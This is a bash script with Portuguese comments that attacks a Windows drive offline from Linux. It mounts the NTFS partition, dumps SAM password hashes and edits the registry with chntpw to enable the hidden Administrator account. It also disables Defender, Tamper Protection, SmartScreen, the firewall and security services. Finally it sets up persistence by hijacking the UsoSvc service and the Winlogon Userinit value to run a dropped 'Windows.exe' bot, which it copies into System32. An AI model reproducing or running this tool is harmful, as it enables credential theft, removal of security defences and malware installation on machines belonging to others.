#!/bin/bash

PAYLOAD="Windows.exe"
DEST_DIR="$HOME/Desktop/Post_Exploitation"
UUID="BA6AF2446AF1FCC7"
MOUNT_POINT="/run/media/root/$UUID"
DISPOSITIVO="/dev/nvme0n1p3"

echo "[+] OPERAÇÃO OMNI TOTAL: DEFEZAS COMPLETAS + RING 0"

# 1. MONTAGEM FORÇADA (ANTI-HIBERNAÇÃO)
sudo umount -l "$DISPOSITIVO" 2>/dev/null
sudo mkdir -p "$MOUNT_POINT"
sudo mount -t ntfs-3g -o rw,remove_hiberfile "$DISPOSITIVO" "$MOUNT_POINT"

SAM="$MOUNT_POINT/Windows/System32/config/SAM"
SOFTWARE="$MOUNT_POINT/Windows/System32/config/SOFTWARE"
SYSTEM="$MOUNT_POINT/Windows/System32/config/SYSTEM"

# 2. HASHES E ADMIN OCULTO
mkdir -p "$DEST_DIR"
sudo samdump2 "$SYSTEM" "$SAM" > "$DEST_DIR/hashes.txt" 2>/dev/null
printf "cd Domains\\\\Account\\\\Users\\\\000001F4\ned F\n11\nq\ny\n" | sudo chntpw -e "$SAM" &>/dev/null

# 3. NUKE: FIREWALL, DEFENDER, SMART-SCREEN, TAMPER PROTECTION
echo "[*] Desativando TODAS as defesas (Firewall, SmartScreen, Tamper)..."
# Desativar Tamper Protection e Real-Time via SOFTWARE
sudo chntpw -e "$SOFTWARE" <<EOF
cd Microsoft\\Windows Defender\\Features
nv 4 TamperProtection
ed TamperProtection
0
cd ..\\Real-Time Protection
nv 4 DisableRealtimeMonitoring
ed DisableRealtimeMonitoring
1
cd ..\\..\\Windows\\CurrentVersion\\Explorer
nv 4 SmartScreenEnabled
ed SmartScreenEnabled
Off
q
y
EOF

# Desativar Firewall e Antimalware via SYSTEM
AV_SERVICES=("WinDefend" "mpssvc" "WdNisSvc" "Sense" "wscsvc")
for svc in "${AV_SERVICES[@]}"; do
    printf "cd ControlSet001\\\\Services\\\\$svc\ned Start\n4\nq\ny\n" | sudo chntpw -e "$SYSTEM" &>/dev/null
done

# 4. RING 0 (UsoSvc) E PERSISTÊNCIA (Userinit)
echo "[*] Injetando Persistência Ring 0..."
printf "cd ControlSet001\\\\Services\\\\UsoSvc\ned ImagePath\nC:\\\\Windows\\\\System32\\\\Windows.exe\nnv 4 Start\ned Start\n2\nq\ny\n" | sudo chntpw -e "$SYSTEM" &>/dev/null
printf "cd Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\ned Userinit\nC:\\\\Windows\\\\system32\\\\userinit.exe,cmd /c start C:\\\\Windows\\\\System32\\\\Windows.exe\nq\ny\n" | sudo chntpw -e "$SOFTWARE" &>/dev/null

# 5. COPIAR BOT E FINALIZAR
if [ -f "./$PAYLOAD" ]; then
    sudo cp "./$PAYLOAD" "$MOUNT_POINT/Windows/System32/"
    sync
    echo "[!!!] SUCESSO. Disco pronto e defesas neutralizadas."
else
    echo "[-] ERRO: $PAYLOAD não encontrado!"
fi
